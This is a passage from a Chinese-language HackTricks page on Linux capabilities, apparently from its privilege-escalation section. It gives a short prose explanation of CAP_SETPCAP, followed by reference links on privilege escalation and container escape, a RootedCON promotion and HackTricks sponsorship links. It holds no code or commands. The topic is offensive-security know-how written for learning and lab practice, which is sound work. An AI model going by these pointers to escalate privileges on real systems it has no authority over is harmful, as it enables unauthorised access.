要有效使用 `CAP_SETPCAP`，您需要在您的有效能力集中拥有该能力，并且在您的许可能力集中拥有目标能力。然后，您可以使用 `capset()` 系统调用来修改其他进程的能力集。

总之，`CAP_SETPCAP` 允许一个进程修改其他进程的能力集，但它不能授予它自身没有的能力。此外，出于安全考虑，最近的内核版本已经限制了其功能，只允许降低其自身许可能力集或其后代的许可能力集中的能力。

## 参考资料

**这些示例大多来自** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com)，因此，如果您想练习这些权限提升技术，我建议参加这些实验室。

**其他参考资料**：

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) 是**西班牙**最重要的网络安全活动之一，也是**欧洲**最重要的之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士在各个领域的热点会议。

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 PDF 版本的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** 上关注我。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
